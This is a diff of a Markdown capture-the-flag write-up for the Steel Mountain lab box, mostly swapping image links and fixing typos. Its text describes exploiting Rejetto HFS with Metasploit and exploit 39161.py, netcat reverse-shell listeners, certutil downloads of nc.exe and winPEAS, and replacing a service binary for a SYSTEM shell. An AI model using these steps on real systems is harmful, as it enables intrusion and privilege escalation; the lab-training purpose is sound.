@@ -25,7 +25,7 @@ Now let's configure the options `show options` and let's make some changes:
 `set RPORT 8080`
 `set LHOST <local IP>`
 We can leave the LPORT to 4444
-And finally hit `run` or `exploit`!
+And finally hit `run` or `exploit`.
 ![](https://github.com/user-attachments/assets/8883396f-88a0-40e4-80b4-1a02c548e4b7)
 And...We're in! `getuid` `STEELMOUNTAIN\bill`
 
@@ -50,20 +50,20 @@ The upload function of meterpreter will automatically overwrite the file.
 ![](https://github.com/user-attachments/assets/966063c5-22f4-431f-addc-29eac14ca34b)
 
 Now it's time to fire up netcat `nc -lvnp 4445` and start the service:
-![[Pasted image 20251115114224.png]]
+![](https://github.com/user-attachments/assets/443f4d1d-f558-42c5-a74e-45c764be9d02)
 
 The service will probably crash but we will have triggered our payload. We are now root.
-![[Pasted image 20251115115712.png]]
+![](https://github.com/user-attachments/assets/048828a9-c5d4-4cbc-a0b7-5dfa5e0c3970)
 
 
-Now we will redo all the phases of this bow without automatic exploitation.
+Now we will redo all the phases of this box without automatic exploitation.
 
 We will begin by searching for an exploit in the exploitdb:
 `searchploit rejetto`
-![[Pasted image 20251116102959.png]]
+![](https://github.com/user-attachments/assets/c78ac923-a65a-4b91-a7d7-acaff97ef817)
 
 We will use the 39161.py one. Let's download it:
-![[Pasted image 20251116103056.png]]
+![](https://github.com/user-attachments/assets/f95e68c9-9f97-4865-b832-184ec411b25c)
 
 In the exploit we only need to change the IP and the LPORT to make it work.
 
@@ -71,27 +71,27 @@ In another terminal we will open a server hosting a `netcat.exe` file named as `
 and open an `nc` listener on another one.
 We need to run this exploit twice, one to upload the `nc.exe` file and one to establish the connection.
 First run:
-![[Pasted image 20251116103425.png]]
+![](https://github.com/user-attachments/assets/71d00b6e-c8a3-4aa2-8762-6f88d6b7e9dd)
 
-![[Pasted image 20251116103549.png]]
+![](https://github.com/user-attachments/assets/f1ca4ff2-63b1-4b8f-ac92-5cb07ad0a277)
 
 Now that we're in, we will upload `winpeas` to do some enumeration:
 We will again open a server hosting the file and use `certutil` to download it:
-![[Pasted image 20251116104818.png]]
+![](https://github.com/user-attachments/assets/7c432bc9-ffba-4a47-9314-d996eb3d1f1d)
 
 Now it's time to fire it up:
 `.\winPEAS.exe servicesinfo`
-![[Pasted image 20251116110013.png]]
+![](https://github.com/user-attachments/assets/d8a33f37-e2da-4b5c-9fea-c98b3047c7b1)
 
 And as predicted, winpeas found our ASC privesc vuln.
 
 Now we will use certutil again to download and substitute the original ASCService.exe with our payload, after we have stopped the service:
-![[Pasted image 20251116110138.png]]
+![](https://github.com/user-attachments/assets/1fd7e1ac-05a2-4f1d-ad3a-4db7a64d9a0d)
 
-![[Pasted image 20251116110849.png]]
+![](https://github.com/user-attachments/assets/cc6d0c75-c85d-41ee-be42-c521a5e6e027)
 
 In another terminal, fire up `nc -lvnp <PORT>` and finally, by restarting the service we will own our root shell. 
 `sc start AdvancedSystemCareService9`
-![[Pasted image 20251116111133.png]]
+![](https://github.com/user-attachments/assets/2137f4d2-deaf-4dc7-aff2-679940aca053)
 
-![[Pasted image 20251116111214.png]]
+![](https://github.com/user-attachments/assets/5bfb89be-31aa-485c-a284-d536c751b012)
